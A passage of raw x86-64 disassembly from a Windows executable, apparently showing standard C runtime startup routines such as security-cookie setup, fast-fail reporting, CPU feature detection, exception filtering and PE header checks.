   140002012:	74 18                	je     0x14000202c
   140002014:	8b 4a 0c             	mov    0xc(%rdx),%ecx
   140002017:	4c 3b c1             	cmp    %rcx,%r8
   14000201a:	72 0a                	jb     0x140002026
   14000201c:	8b 42 08             	mov    0x8(%rdx),%eax
   14000201f:	03 c1                	add    %ecx,%eax
   140002021:	4c 3b c0             	cmp    %rax,%r8
   140002024:	72 08                	jb     0x14000202e
   140002026:	48 83 c2 28          	add    $0x28,%rdx
   14000202a:	eb df                	jmp    0x14000200b
   14000202c:	33 d2                	xor    %edx,%edx
   14000202e:	48 85 d2             	test   %rdx,%rdx
   140002031:	75 04                	jne    0x140002037
   140002033:	32 c0                	xor    %al,%al
   140002035:	eb 14                	jmp    0x14000204b
   140002037:	83 7a 24 00          	cmpl   $0x0,0x24(%rdx)
   14000203b:	7d 04                	jge    0x140002041
   14000203d:	32 c0                	xor    %al,%al
   14000203f:	eb 0a                	jmp    0x14000204b
   140002041:	b0 01                	mov    $0x1,%al
   140002043:	eb 06                	jmp    0x14000204b
   140002045:	32 c0                	xor    %al,%al
   140002047:	eb 02                	jmp    0x14000204b
   140002049:	32 c0                	xor    %al,%al
   14000204b:	48 83 c4 18          	add    $0x18,%rsp
   14000204f:	c3                   	ret
   140002050:	40 53                	rex push %rbx
   140002052:	48 83 ec 20          	sub    $0x20,%rsp
   140002056:	8a d9                	mov    %cl,%bl
   140002058:	e8 ef 05 00 00       	call   0x14000264c
   14000205d:	33 d2                	xor    %edx,%edx
   14000205f:	85 c0                	test   %eax,%eax
   140002061:	74 0b                	je     0x14000206e
   140002063:	84 db                	test   %bl,%bl
   140002065:	75 07                	jne    0x14000206e
   140002067:	48 87 15 ca 59 01 00 	xchg   %rdx,0x159ca(%rip)        # 0x140017a38
   14000206e:	48 83 c4 20          	add    $0x20,%rsp
   140002072:	5b                   	pop    %rbx
   140002073:	c3                   	ret
   140002074:	40 53                	rex push %rbx
   140002076:	48 83 ec 20          	sub    $0x20,%rsp
   14000207a:	80 3d bf 59 01 00 00 	cmpb   $0x0,0x159bf(%rip)        # 0x140017a40
   140002081:	8a d9                	mov    %cl,%bl
   140002083:	74 04                	je     0x140002089
   140002085:	84 d2                	test   %dl,%dl
   140002087:	75 0c                	jne    0x140002095
   140002089:	e8 5a 2b 00 00       	call   0x140004be8
   14000208e:	8a cb                	mov    %bl,%cl
   140002090:	e8 9b 08 00 00       	call   0x140002930
   140002095:	b0 01                	mov    $0x1,%al
   140002097:	48 83 c4 20          	add    $0x20,%rsp
   14000209b:	5b                   	pop    %rbx
   14000209c:	c3                   	ret
   14000209d:	cc                   	int3
   14000209e:	cc                   	int3
   14000209f:	cc                   	int3
   1400020a0:	40 53                	rex push %rbx
   1400020a2:	48 83 ec 20          	sub    $0x20,%rsp
   1400020a6:	48 83 3d 9a 59 01 00 	cmpq   $0xffffffffffffffff,0x1599a(%rip)        # 0x140017a48
   1400020ad:	ff 
   1400020ae:	48 8b d9             	mov    %rcx,%rbx
   1400020b1:	75 07                	jne    0x1400020ba
   1400020b3:	e8 34 29 00 00       	call   0x1400049ec
   1400020b8:	eb 0f                	jmp    0x1400020c9
   1400020ba:	48 8b d3             	mov    %rbx,%rdx
   1400020bd:	48 8d 0d 84 59 01 00 	lea    0x15984(%rip),%rcx        # 0x140017a48
   1400020c4:	e8 97 29 00 00       	call   0x140004a60
   1400020c9:	33 d2                	xor    %edx,%edx
   1400020cb:	85 c0                	test   %eax,%eax
   1400020cd:	48 0f 44 d3          	cmove  %rbx,%rdx
   1400020d1:	48 8b c2             	mov    %rdx,%rax
   1400020d4:	48 83 c4 20          	add    $0x20,%rsp
   1400020d8:	5b                   	pop    %rbx
   1400020d9:	c3                   	ret
   1400020da:	cc                   	int3
   1400020db:	cc                   	int3
   1400020dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400020e0:	e8 bb ff ff ff       	call   0x1400020a0
   1400020e5:	48 f7 d8             	neg    %rax
   1400020e8:	1b c0                	sbb    %eax,%eax
   1400020ea:	f7 d8                	neg    %eax
   1400020ec:	ff c8                	dec    %eax
   1400020ee:	48 83 c4 28          	add    $0x28,%rsp
   1400020f2:	c3                   	ret
   1400020f3:	cc                   	int3
   1400020f4:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400020f9:	55                   	push   %rbp
   1400020fa:	48 8b ec             	mov    %rsp,%rbp
   1400020fd:	48 83 ec 20          	sub    $0x20,%rsp
   140002101:	48 8b 05 20 4f 01 00 	mov    0x14f20(%rip),%rax        # 0x140017028
   140002108:	48 bb 32 a2 df 2d 99 	movabs $0x2b992ddfa232,%rbx
   14000210f:	2b 00 00 
   140002112:	48 3b c3             	cmp    %rbx,%rax
   140002115:	75 74                	jne    0x14000218b
   140002117:	48 83 65 18 00       	andq   $0x0,0x18(%rbp)
   14000211c:	48 8d 4d 18          	lea    0x18(%rbp),%rcx
   140002120:	ff 15 0a bf 00 00    	call   *0xbf0a(%rip)        # 0x14000e030
   140002126:	48 8b 45 18          	mov    0x18(%rbp),%rax
   14000212a:	48 89 45 10          	mov    %rax,0x10(%rbp)
   14000212e:	ff 15 f4 be 00 00    	call   *0xbef4(%rip)        # 0x14000e028
   140002134:	8b c0                	mov    %eax,%eax
   140002136:	48 31 45 10          	xor    %rax,0x10(%rbp)
   14000213a:	ff 15 e0 be 00 00    	call   *0xbee0(%rip)        # 0x14000e020
   140002140:	8b c0                	mov    %eax,%eax
   140002142:	48 8d 4d 20          	lea    0x20(%rbp),%rcx
   140002146:	48 31 45 10          	xor    %rax,0x10(%rbp)
   14000214a:	ff 15 c8 be 00 00    	call   *0xbec8(%rip)        # 0x14000e018
   140002150:	8b 45 20             	mov    0x20(%rbp),%eax
   140002153:	48 8d 4d 10          	lea    0x10(%rbp),%rcx
   140002157:	48 c1 e0 20          	shl    $0x20,%rax
   14000215b:	48 33 45 20          	xor    0x20(%rbp),%rax
   14000215f:	48 33 45 10          	xor    0x10(%rbp),%rax
   140002163:	48 33 c1             	xor    %rcx,%rax
   140002166:	48 b9 ff ff ff ff ff 	movabs $0xffffffffffff,%rcx
   14000216d:	ff 00 00 
   140002170:	48 23 c1             	and    %rcx,%rax
   140002173:	48 b9 33 a2 df 2d 99 	movabs $0x2b992ddfa233,%rcx
   14000217a:	2b 00 00 
   14000217d:	48 3b c3             	cmp    %rbx,%rax
   140002180:	48 0f 44 c1          	cmove  %rcx,%rax
   140002184:	48 89 05 9d 4e 01 00 	mov    %rax,0x14e9d(%rip)        # 0x140017028
   14000218b:	48 8b 5c 24 48       	mov    0x48(%rsp),%rbx
   140002190:	48 f7 d0             	not    %rax
   140002193:	48 89 05 86 4e 01 00 	mov    %rax,0x14e86(%rip)        # 0x140017020
   14000219a:	48 83 c4 20          	add    $0x20,%rsp
   14000219e:	5d                   	pop    %rbp
   14000219f:	c3                   	ret
   1400021a0:	33 c0                	xor    %eax,%eax
   1400021a2:	c3                   	ret
   1400021a3:	cc                   	int3
   1400021a4:	b8 01 00 00 00       	mov    $0x1,%eax
   1400021a9:	c3                   	ret
   1400021aa:	cc                   	int3
   1400021ab:	cc                   	int3
   1400021ac:	b8 00 40 00 00       	mov    $0x4000,%eax
   1400021b1:	c3                   	ret
   1400021b2:	cc                   	int3
   1400021b3:	cc                   	int3
   1400021b4:	48 8d 0d c5 58 01 00 	lea    0x158c5(%rip),%rcx        # 0x140017a80
   1400021bb:	48 ff 25 76 be 00 00 	rex.W jmp *0xbe76(%rip)        # 0x14000e038
   1400021c2:	cc                   	int3
   1400021c3:	cc                   	int3
   1400021c4:	b0 01                	mov    $0x1,%al
   1400021c6:	c3                   	ret
   1400021c7:	cc                   	int3
   1400021c8:	c2 00 00             	ret    $0x0
   1400021cb:	cc                   	int3
   1400021cc:	48 8d 05 bd 58 01 00 	lea    0x158bd(%rip),%rax        # 0x140017a90
   1400021d3:	c3                   	ret
   1400021d4:	48 8d 05 bd 58 01 00 	lea    0x158bd(%rip),%rax        # 0x140017a98
   1400021db:	c3                   	ret
   1400021dc:	48 83 ec 28          	sub    $0x28,%rsp
   1400021e0:	e8 e7 ff ff ff       	call   0x1400021cc
   1400021e5:	48 83 08 24          	orq    $0x24,(%rax)
   1400021e9:	e8 e6 ff ff ff       	call   0x1400021d4
   1400021ee:	48 83 08 02          	orq    $0x2,(%rax)
   1400021f2:	48 83 c4 28          	add    $0x28,%rsp
   1400021f6:	c3                   	ret
   1400021f7:	cc                   	int3
   1400021f8:	33 c0                	xor    %eax,%eax
   1400021fa:	39 05 04 4e 01 00    	cmp    %eax,0x14e04(%rip)        # 0x140017004
   140002200:	0f 94 c0             	sete   %al
   140002203:	c3                   	ret
   140002204:	48 8d 05 fd 69 01 00 	lea    0x169fd(%rip),%rax        # 0x140018c08
   14000220b:	c3                   	ret
   14000220c:	48 8d 05 ed 69 01 00 	lea    0x169ed(%rip),%rax        # 0x140018c00
   140002213:	c3                   	ret
   140002214:	83 25 85 58 01 00 00 	andl   $0x0,0x15885(%rip)        # 0x140017aa0
   14000221b:	c3                   	ret
   14000221c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002221:	55                   	push   %rbp
   140002222:	48 8d ac 24 40 fb ff 	lea    -0x4c0(%rsp),%rbp
   140002229:	ff 
   14000222a:	48 81 ec c0 05 00 00 	sub    $0x5c0,%rsp
   140002231:	8b d9                	mov    %ecx,%ebx
   140002233:	b9 17 00 00 00       	mov    $0x17,%ecx
   140002238:	ff 15 3a be 00 00    	call   *0xbe3a(%rip)        # 0x14000e078
   14000223e:	85 c0                	test   %eax,%eax
   140002240:	74 04                	je     0x140002246
   140002242:	8b cb                	mov    %ebx,%ecx
   140002244:	cd 29                	int    $0x29
   140002246:	b9 03 00 00 00       	mov    $0x3,%ecx
   14000224b:	e8 c4 ff ff ff       	call   0x140002214
   140002250:	33 d2                	xor    %edx,%edx
   140002252:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002256:	41 b8 d0 04 00 00    	mov    $0x4d0,%r8d
   14000225c:	e8 1f 07 00 00       	call   0x140002980
   140002261:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   140002265:	ff 15 d5 bd 00 00    	call   *0xbdd5(%rip)        # 0x14000e040
   14000226b:	48 8b 9d e8 00 00 00 	mov    0xe8(%rbp),%rbx
   140002272:	48 8d 95 d8 04 00 00 	lea    0x4d8(%rbp),%rdx
   140002279:	48 8b cb             	mov    %rbx,%rcx
   14000227c:	45 33 c0             	xor    %r8d,%r8d
   14000227f:	ff 15 c3 bd 00 00    	call   *0xbdc3(%rip)        # 0x14000e048
   140002285:	48 85 c0             	test   %rax,%rax
   140002288:	74 3c                	je     0x1400022c6
   14000228a:	48 83 64 24 38 00    	andq   $0x0,0x38(%rsp)
   140002290:	48 8d 8d e0 04 00 00 	lea    0x4e0(%rbp),%rcx
   140002297:	48 8b 95 d8 04 00 00 	mov    0x4d8(%rbp),%rdx
   14000229e:	4c 8b c8             	mov    %rax,%r9
   1400022a1:	48 89 4c 24 30       	mov    %rcx,0x30(%rsp)
   1400022a6:	4c 8b c3             	mov    %rbx,%r8
   1400022a9:	48 8d 8d e8 04 00 00 	lea    0x4e8(%rbp),%rcx
   1400022b0:	48 89 4c 24 28       	mov    %rcx,0x28(%rsp)
   1400022b5:	48 8d 4d f0          	lea    -0x10(%rbp),%rcx
   1400022b9:	48 89 4c 24 20       	mov    %rcx,0x20(%rsp)
   1400022be:	33 c9                	xor    %ecx,%ecx
   1400022c0:	ff 15 8a bd 00 00    	call   *0xbd8a(%rip)        # 0x14000e050
   1400022c6:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400022cd:	48 8d 4c 24 50       	lea    0x50(%rsp),%rcx
   1400022d2:	48 89 85 e8 00 00 00 	mov    %rax,0xe8(%rbp)
   1400022d9:	33 d2                	xor    %edx,%edx
   1400022db:	48 8d 85 c8 04 00 00 	lea    0x4c8(%rbp),%rax
   1400022e2:	41 b8 98 00 00 00    	mov    $0x98,%r8d
   1400022e8:	48 83 c0 08          	add    $0x8,%rax
   1400022ec:	48 89 85 88 00 00 00 	mov    %rax,0x88(%rbp)
   1400022f3:	e8 88 06 00 00       	call   0x140002980
   1400022f8:	48 8b 85 c8 04 00 00 	mov    0x4c8(%rbp),%rax
   1400022ff:	48 89 44 24 60       	mov    %rax,0x60(%rsp)
   140002304:	c7 44 24 50 15 00 00 	movl   $0x40000015,0x50(%rsp)
   14000230b:	40 
   14000230c:	c7 44 24 54 01 00 00 	movl   $0x1,0x54(%rsp)
   140002313:	00 
   140002314:	ff 15 3e bd 00 00    	call   *0xbd3e(%rip)        # 0x14000e058
   14000231a:	83 f8 01             	cmp    $0x1,%eax
   14000231d:	48 8d 44 24 50       	lea    0x50(%rsp),%rax
   140002322:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140002327:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   14000232b:	0f 94 c3             	sete   %bl
   14000232e:	48 89 44 24 48       	mov    %rax,0x48(%rsp)
   140002333:	33 c9                	xor    %ecx,%ecx
   140002335:	ff 15 2d bd 00 00    	call   *0xbd2d(%rip)        # 0x14000e068
   14000233b:	48 8d 4c 24 40       	lea    0x40(%rsp),%rcx
   140002340:	ff 15 1a bd 00 00    	call   *0xbd1a(%rip)        # 0x14000e060
   140002346:	85 c0                	test   %eax,%eax
   140002348:	75 0c                	jne    0x140002356
   14000234a:	84 db                	test   %bl,%bl
   14000234c:	75 08                	jne    0x140002356
   14000234e:	8d 48 03             	lea    0x3(%rax),%ecx
   140002351:	e8 be fe ff ff       	call   0x140002214
   140002356:	48 8b 9c 24 d0 05 00 	mov    0x5d0(%rsp),%rbx
   14000235d:	00 
   14000235e:	48 81 c4 c0 05 00 00 	add    $0x5c0,%rsp
   140002365:	5d                   	pop    %rbp
   140002366:	c3                   	ret
   140002367:	cc                   	int3
   140002368:	e9 33 fe ff ff       	jmp    0x1400021a0
   14000236d:	cc                   	int3
   14000236e:	cc                   	int3
   14000236f:	cc                   	int3
   140002370:	48 83 ec 28          	sub    $0x28,%rsp
   140002374:	33 c9                	xor    %ecx,%ecx
   140002376:	ff 15 04 bd 00 00    	call   *0xbd04(%rip)        # 0x14000e080
   14000237c:	48 85 c0             	test   %rax,%rax
   14000237f:	74 3a                	je     0x1400023bb
   140002381:	b9 4d 5a 00 00       	mov    $0x5a4d,%ecx
   140002386:	66 39 08             	cmp    %cx,(%rax)
   140002389:	75 30                	jne    0x1400023bb
   14000238b:	48 63 48 3c          	movslq 0x3c(%rax),%rcx
   14000238f:	48 03 c8             	add    %rax,%rcx
   140002392:	81 39 50 45 00 00    	cmpl   $0x4550,(%rcx)
   140002398:	75 21                	jne    0x1400023bb
   14000239a:	b8 0b 02 00 00       	mov    $0x20b,%eax
   14000239f:	66 39 41 18          	cmp    %ax,0x18(%rcx)
   1400023a3:	75 16                	jne    0x1400023bb
   1400023a5:	83 b9 84 00 00 00 0e 	cmpl   $0xe,0x84(%rcx)
   1400023ac:	76 0d                	jbe    0x1400023bb
   1400023ae:	83 b9 f8 00 00 00 00 	cmpl   $0x0,0xf8(%rcx)
   1400023b5:	74 04                	je     0x1400023bb
   1400023b7:	b0 01                	mov    $0x1,%al
   1400023b9:	eb 02                	jmp    0x1400023bd
   1400023bb:	32 c0                	xor    %al,%al
   1400023bd:	48 83 c4 28          	add    $0x28,%rsp
   1400023c1:	c3                   	ret
   1400023c2:	cc                   	int3
   1400023c3:	cc                   	int3
   1400023c4:	48 8d 0d 09 00 00 00 	lea    0x9(%rip),%rcx        # 0x1400023d4
   1400023cb:	48 ff 25 96 bc 00 00 	rex.W jmp *0xbc96(%rip)        # 0x14000e068
   1400023d2:	cc                   	int3
   1400023d3:	cc                   	int3
   1400023d4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400023d9:	57                   	push   %rdi
   1400023da:	48 83 ec 20          	sub    $0x20,%rsp
   1400023de:	48 8b 19             	mov    (%rcx),%rbx
   1400023e1:	48 8b f9             	mov    %rcx,%rdi
   1400023e4:	81 3b 63 73 6d e0    	cmpl   $0xe06d7363,(%rbx)
   1400023ea:	75 1c                	jne    0x140002408
   1400023ec:	83 7b 18 04          	cmpl   $0x4,0x18(%rbx)
   1400023f0:	75 16                	jne    0x140002408
   1400023f2:	8b 53 20             	mov    0x20(%rbx),%edx
   1400023f5:	8d 82 e0 fa 6c e6    	lea    -0x19930520(%rdx),%eax
   1400023fb:	83 f8 02             	cmp    $0x2,%eax
   1400023fe:	76 15                	jbe    0x140002415
   140002400:	81 fa 00 40 99 01    	cmp    $0x1994000,%edx
   140002406:	74 0d                	je     0x140002415
   140002408:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000240d:	33 c0                	xor    %eax,%eax
   14000240f:	48 83 c4 20          	add    $0x20,%rsp
   140002413:	5f                   	pop    %rdi
   140002414:	c3                   	ret
   140002415:	e8 ba 02 00 00       	call   0x1400026d4
   14000241a:	48 89 18             	mov    %rbx,(%rax)
   14000241d:	48 8b 5f 08          	mov    0x8(%rdi),%rbx
   140002421:	e8 c2 02 00 00       	call   0x1400026e8
   140002426:	48 89 18             	mov    %rbx,(%rax)
   140002429:	e8 f2 27 00 00       	call   0x140004c20
   14000242e:	cc                   	int3
   14000242f:	cc                   	int3
   140002430:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002435:	57                   	push   %rdi
   140002436:	48 83 ec 20          	sub    $0x20,%rsp
   14000243a:	48 8d 1d 2f 36 01 00 	lea    0x1362f(%rip),%rbx        # 0x140015a70
   140002441:	48 8d 3d 28 36 01 00 	lea    0x13628(%rip),%rdi        # 0x140015a70
   140002448:	eb 12                	jmp    0x14000245c
   14000244a:	48 8b 03             	mov    (%rbx),%rax
   14000244d:	48 85 c0             	test   %rax,%rax
   140002450:	74 06                	je     0x140002458
   140002452:	ff 15 e0 bd 00 00    	call   *0xbde0(%rip)        # 0x14000e238
   140002458:	48 83 c3 08          	add    $0x8,%rbx
   14000245c:	48 3b df             	cmp    %rdi,%rbx
   14000245f:	72 e9                	jb     0x14000244a
   140002461:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140002466:	48 83 c4 20          	add    $0x20,%rsp
   14000246a:	5f                   	pop    %rdi
   14000246b:	c3                   	ret
   14000246c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002471:	57                   	push   %rdi
   140002472:	48 83 ec 20          	sub    $0x20,%rsp
   140002476:	48 8d 1d 03 36 01 00 	lea    0x13603(%rip),%rbx        # 0x140015a80
   14000247d:	48 8d 3d fc 35 01 00 	lea    0x135fc(%rip),%rdi        # 0x140015a80
   140002484:	eb 12                	jmp    0x140002498
   140002486:	48 8b 03             	mov    (%rbx),%rax
   140002489:	48 85 c0             	test   %rax,%rax
   14000248c:	74 06                	je     0x140002494
   14000248e:	ff 15 a4 bd 00 00    	call   *0xbda4(%rip)        # 0x14000e238
   140002494:	48 83 c3 08          	add    $0x8,%rbx
   140002498:	48 3b df             	cmp    %rdi,%rbx
   14000249b:	72 e9                	jb     0x140002486
   14000249d:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400024a2:	48 83 c4 20          	add    $0x20,%rsp
   1400024a6:	5f                   	pop    %rdi
   1400024a7:	c3                   	ret
   1400024a8:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   1400024ad:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400024b2:	57                   	push   %rdi
   1400024b3:	48 83 ec 10          	sub    $0x10,%rsp
   1400024b7:	33 c0                	xor    %eax,%eax
   1400024b9:	33 c9                	xor    %ecx,%ecx
   1400024bb:	0f a2                	cpuid
   1400024bd:	44 8b c1             	mov    %ecx,%r8d
   1400024c0:	45 33 db             	xor    %r11d,%r11d
   1400024c3:	44 8b cb             	mov    %ebx,%r9d
   1400024c6:	41 81 f0 6e 74 65 6c 	xor    $0x6c65746e,%r8d
   1400024cd:	41 81 f1 47 65 6e 75 	xor    $0x756e6547,%r9d
   1400024d4:	44 8b d2             	mov    %edx,%r10d
   1400024d7:	8b f0                	mov    %eax,%esi
   1400024d9:	33 c9                	xor    %ecx,%ecx
   1400024db:	41 8d 43 01          	lea    0x1(%r11),%eax
   1400024df:	45 0b c8             	or     %r8d,%r9d
   1400024e2:	0f a2                	cpuid
   1400024e4:	41 81 f2 69 6e 65 49 	xor    $0x49656e69,%r10d
   1400024eb:	89 04 24             	mov    %eax,(%rsp)
   1400024ee:	45 0b ca             	or     %r10d,%r9d
   1400024f1:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   1400024f5:	8b f9                	mov    %ecx,%edi
   1400024f7:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   1400024fb:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   1400024ff:	75 50                	jne    0x140002551
   140002501:	48 83 0d 07 4b 01 00 	orq    $0xffffffffffffffff,0x14b07(%rip)        # 0x140017010
   140002508:	ff 
   140002509:	25 f0 3f ff 0f       	and    $0xfff3ff0,%eax
   14000250e:	3d c0 06 01 00       	cmp    $0x106c0,%eax
   140002513:	74 28                	je     0x14000253d
   140002515:	3d 60 06 02 00       	cmp    $0x20660,%eax
   14000251a:	74 21                	je     0x14000253d
   14000251c:	3d 70 06 02 00       	cmp    $0x20670,%eax
   140002521:	74 1a                	je     0x14000253d
   140002523:	05 b0 f9 fc ff       	add    $0xfffcf9b0,%eax
   140002528:	83 f8 20             	cmp    $0x20,%eax
   14000252b:	77 24                	ja     0x140002551
   14000252d:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140002534:	00 00 00 
   140002537:	48 0f a3 c1          	bt     %rax,%rcx
   14000253b:	73 14                	jae    0x140002551
   14000253d:	44 8b 05 6c 55 01 00 	mov    0x1556c(%rip),%r8d        # 0x140017ab0
   140002544:	41 83 c8 01          	or     $0x1,%r8d
   140002548:	44 89 05 61 55 01 00 	mov    %r8d,0x15561(%rip)        # 0x140017ab0
   14000254f:	eb 07                	jmp    0x140002558
   140002551:	44 8b 05 58 55 01 00 	mov    0x15558(%rip),%r8d        # 0x140017ab0
   140002558:	b8 07 00 00 00       	mov    $0x7,%eax
   14000255d:	44 8d 48 fb          	lea    -0x5(%rax),%r9d
   140002561:	3b f0                	cmp    %eax,%esi
   140002563:	7c 26                	jl     0x14000258b
   140002565:	33 c9                	xor    %ecx,%ecx
   140002567:	0f a2                	cpuid
   140002569:	89 04 24             	mov    %eax,(%rsp)
   14000256c:	44 8b db             	mov    %ebx,%r11d
   14000256f:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   140002573:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002577:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   14000257b:	0f ba e3 09          	bt     $0x9,%ebx
   14000257f:	73 0a                	jae    0x14000258b
   140002581:	45 0b c1             	or     %r9d,%r8d
   140002584:	44 89 05 25 55 01 00 	mov    %r8d,0x15525(%rip)        # 0x140017ab0
   14000258b:	c7 05 73 4a 01 00 01 	movl   $0x1,0x14a73(%rip)        # 0x140017008
   140002592:	00 00 00 
   140002595:	44 89 0d 70 4a 01 00 	mov    %r9d,0x14a70(%rip)        # 0x14001700c
   14000259c:	0f ba e7 14          	bt     $0x14,%edi
   1400025a0:	0f 83 91 00 00 00    	jae    0x140002637
   1400025a6:	44 89 0d 5b 4a 01 00 	mov    %r9d,0x14a5b(%rip)        # 0x140017008
   1400025ad:	bb 06 00 00 00       	mov    $0x6,%ebx
   1400025b2:	89 1d 54 4a 01 00    	mov    %ebx,0x14a54(%rip)        # 0x14001700c
   1400025b8:	0f ba e7 1b          	bt     $0x1b,%edi
   1400025bc:	73 79                	jae    0x140002637
   1400025be:	0f ba e7 1c          	bt     $0x1c,%edi
   1400025c2:	73 73                	jae    0x140002637
   1400025c4:	33 c9                	xor    %ecx,%ecx
   1400025c6:	0f 01 d0             	xgetbv
   1400025c9:	48 c1 e2 20          	shl    $0x20,%rdx
   1400025cd:	48 0b d0             	or     %rax,%rdx
   1400025d0:	48 89 54 24 20       	mov    %rdx,0x20(%rsp)
   1400025d5:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   1400025da:	22 c3                	and    %bl,%al
   1400025dc:	3a c3                	cmp    %bl,%al
   1400025de:	75 57                	jne    0x140002637
   1400025e0:	8b 05 26 4a 01 00    	mov    0x14a26(%rip),%eax        # 0x14001700c
   1400025e6:	83 c8 08             	or     $0x8,%eax
   1400025e9:	c7 05 15 4a 01 00 03 	movl   $0x3,0x14a15(%rip)        # 0x140017008
   1400025f0:	00 00 00 
   1400025f3:	89 05 13 4a 01 00    	mov    %eax,0x14a13(%rip)        # 0x14001700c
   1400025f9:	41 f6 c3 20          	test   $0x20,%r11b
   1400025fd:	74 38                	je     0x140002637
   1400025ff:	83 c8 20             	or     $0x20,%eax
   140002602:	c7 05 fc 49 01 00 05 	movl   $0x5,0x149fc(%rip)        # 0x140017008
   140002609:	00 00 00 
   14000260c:	89 05 fa 49 01 00    	mov    %eax,0x149fa(%rip)        # 0x14001700c
   140002612:	b8 00 00 03 d0       	mov    $0xd0030000,%eax
   140002617:	44 23 d8             	and    %eax,%r11d
   14000261a:	44 3b d8             	cmp    %eax,%r11d
   14000261d:	75 18                	jne    0x140002637
   14000261f:	48 8b 44 24 20       	mov    0x20(%rsp),%rax
   140002624:	24 e0                	and    $0xe0,%al
   140002626:	3c e0                	cmp    $0xe0,%al
   140002628:	75 0d                	jne    0x140002637
   14000262a:	83 0d db 49 01 00 40 	orl    $0x40,0x149db(%rip)        # 0x14001700c
   140002631:	89 1d d1 49 01 00    	mov    %ebx,0x149d1(%rip)        # 0x140017008
   140002637:	48 8b 5c 24 28       	mov    0x28(%rsp),%rbx
   14000263c:	33 c0                	xor    %eax,%eax
   14000263e:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140002643:	48 83 c4 10          	add    $0x10,%rsp
   140002647:	5f                   	pop    %rdi
   140002648:	c3                   	ret
   140002649:	cc                   	int3
   14000264a:	cc                   	int3
   14000264b:	cc                   	int3
   14000264c:	33 c0                	xor    %eax,%eax
   14000264e:	39 05 a8 65 01 00    	cmp    %eax,0x165a8(%rip)        # 0x140018bfc
   140002654:	0f 95 c0             	setne  %al
   140002657:	c3                   	ret
   140002658:	cc                   	int3
   140002659:	cc                   	int3
   14000265a:	cc                   	int3
   14000265b:	cc                   	int3
   14000265c:	cc                   	int3
   14000265d:	cc                   	int3
   14000265e:	cc                   	int3
   14000265f:	cc                   	int3
   140002660:	48 85 c9             	test   %rcx,%rcx
   140002663:	74 67                	je     0x1400026cc
   140002665:	88 54 24 10          	mov    %dl,0x10(%rsp)
   140002669:	48 83 ec 48          	sub    $0x48,%rsp
   14000266d:	81 39 63 73 6d e0    	cmpl   $0xe06d7363,(%rcx)
   140002673:	75 53                	jne    0x1400026c8
   140002675:	83 79 18 04          	cmpl   $0x4,0x18(%rcx)
   140002679:	75 4d                	jne    0x1400026c8
   14000267b:	8b 41 20             	mov    0x20(%rcx),%eax
   14000267e:	2d 20 05 93 19       	sub    $0x19930520,%eax
   140002683:	83 f8 02             	cmp    $0x2,%eax
   140002686:	77 40                	ja     0x1400026c8
   140002688:	48 8b 41 30          	mov    0x30(%rcx),%rax
   14000268c:	48 85 c0             	test   %rax,%rax
   14000268f:	74 37                	je     0x1400026c8
   140002691:	48 63 50 04          	movslq 0x4(%rax),%rdx
   140002695:	85 d2                	test   %edx,%edx
   140002697:	74 11                	je     0x1400026aa
   140002699:	48 03 51 38          	add    0x38(%rcx),%rdx
   14000269d:	48 8b 49 28          	mov    0x28(%rcx),%rcx
   1400026a1:	e8 2a 00 00 00       	call   0x1400026d0
   1400026a6:	eb 20                	jmp    0x1400026c8
   1400026a8:	eb 1e                	jmp    0x1400026c8
   1400026aa:	f6 00 10             	testb  $0x10,(%rax)
   1400026ad:	74 19                	je     0x1400026c8
   1400026af:	48 8b 41 28          	mov    0x28(%rcx),%rax
   1400026b3:	48 8b 08             	mov    (%rax),%rcx
   1400026b6:	48 85 c9             	test   %rcx,%rcx
   1400026b9:	74 0d                	je     0x1400026c8
   1400026bb:	48 8b 01             	mov    (%rcx),%rax
   1400026be:	48 8b 40 10          	mov    0x10(%rax),%rax
   1400026c2:	ff 15 70 bb 00 00    	call   *0xbb70(%rip)        # 0x14000e238
   1400026c8:	48 83 c4 48          	add    $0x48,%rsp
   1400026cc:	c3                   	ret
   1400026cd:	cc                   	int3
   1400026ce:	cc                   	int3
   1400026cf:	cc                   	int3
   1400026d0:	48 ff e2             	rex.W jmp *%rdx
   1400026d3:	cc                   	int3
   1400026d4:	48 83 ec 28          	sub    $0x28,%rsp
   1400026d8:	e8 53 04 00 00       	call   0x140002b30
   1400026dd:	48 83 c0 20          	add    $0x20,%rax
   1400026e1:	48 83 c4 28          	add    $0x28,%rsp
   1400026e5:	c3                   	ret
   1400026e6:	cc                   	int3
   1400026e7:	cc                   	int3
   1400026e8:	48 83 ec 28          	sub    $0x28,%rsp
   1400026ec:	e8 3f 04 00 00       	call   0x140002b30
   1400026f1:	48 83 c0 28          	add    $0x28,%rax
   1400026f5:	48 83 c4 28          	add    $0x28,%rsp
   1400026f9:	c3                   	ret
   1400026fa:	cc                   	int3
   1400026fb:	cc                   	int3
   1400026fc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002701:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140002706:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000270b:	57                   	push   %rdi
   14000270c:	41 54                	push   %r12
   14000270e:	41 55                	push   %r13
   140002710:	41 56                	push   %r14
   140002712:	41 57                	push   %r15
